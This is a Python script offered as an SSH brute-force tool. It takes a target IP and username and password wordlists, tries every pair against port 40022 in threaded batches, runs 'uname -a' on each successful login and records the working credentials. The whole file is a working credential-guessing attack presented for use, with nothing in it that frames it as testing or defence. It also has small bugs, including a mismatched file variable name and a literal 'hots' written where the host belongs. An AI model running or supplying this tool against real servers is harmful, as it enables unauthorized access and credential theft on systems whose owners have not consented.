#!/usr/bin/env python3
import paramiko 
import os
import sys
import ipaddress
import threading


def ssh_bf(host, uname,upassword):
	uname = uname.strip()
	upassword = upassword.strip()
	lock = threading.Lock()
	lock.acquire()
	#print('aaaaaaa')
	print('testing '+host+'\t'+uname+':'+upassword)
	client = paramiko.SSHClient()
	client.set_missing_host_key_policy(paramiko.AutoAddPolicy())#主要是针对自动添加host key的验证
	try:
		client.connect(host,40022,username=uname,password=upassword)
		stdin, stdout,stderr = client.exec_command('uname -a')
		out = str(stdout.readlines()[0])#stdout.readlines() ==> ['root\n'] list类型
		out = out.strip()
		print('\033[1;32;40m')
		print('[+] Login sucessful!\t'+host,'  '+uname+':'+upassword+'\n'+out)
		print('\033[0m')
		sucess_file.write('hots\t'+uname+':'+upassword+'\n')
	except:
		#print('oh no')#出现错误
		pass
	lock.release()
	client.close()
def main(host,userfile,passfile):
	success_file = open('result.txt','w')
	global sucess_file
	u_file = open(userfile,'r')
	p_file = open(passfile,'r')
	username = []
	password = []
	thread_num = 5
	#num = 0
	for a in u_file.readlines():
		username.append(a)
	for b in p_file.readlines():
		password.append(b)
	
	u_file.close()
	p_file.close()
	len_user = len(username)
	len_pass = len(password)
	#print(len_user)
	#if len_pass < thread_num:
	#	num = len_pass
	#else:
	#	num = thread_num	
	threads = []
	for i in range(len_user):	
		#print('user num is:'+str(i))
		for j in range(0,len_pass,thread_num):#20 threads
			num = len_pass-j
			if num >= thread_num:
				num = thread_num
			else:
				num = num #<20
			for k in range(num):
				l = j+k
				#print('pass num is:' + str(l))
				t = threading.Thread(target=ssh_bf, args=(host,\
						username[i],password[l],))
				threads.append(t)
			for m in range(len(threads)):
				threads[m].start()
			for n in range(len(threads)):
				threads[n].join()
			threads.clear()
	#sys.exit()	
	sucess_file.close()

def logo():
	print('''	
	******************************************************************
	This is a simple ssh bruteforce python3 script written by xiaosong.
	(you need to install paramiko,pycrypto and ecdsa.)
			 @V@ @v@ @v@  @V@
	******************************************************************
	''')


if __name__ =='__main__':
	logo()
	if len(sys.argv) != 4:
		print('usage: xx.py ip userfile passfile')
		sys.exit()
	else:
		pass
	host = sys.argv[1]
	user_file = sys.argv[2]
	pass_file = sys.argv[3]
	try:
		ip = ipaddress.ip_address(host)
		ip = str(ip)
	except:
		print('may not a valid ip !')
		sys.exit()
	if (os.path.exists(user_file)) and (os.path.exists(pass_file)):
		main(host,user_file,pass_file)
	else:
		print('user_file or pass_file may not exists !')
		sys.exit()
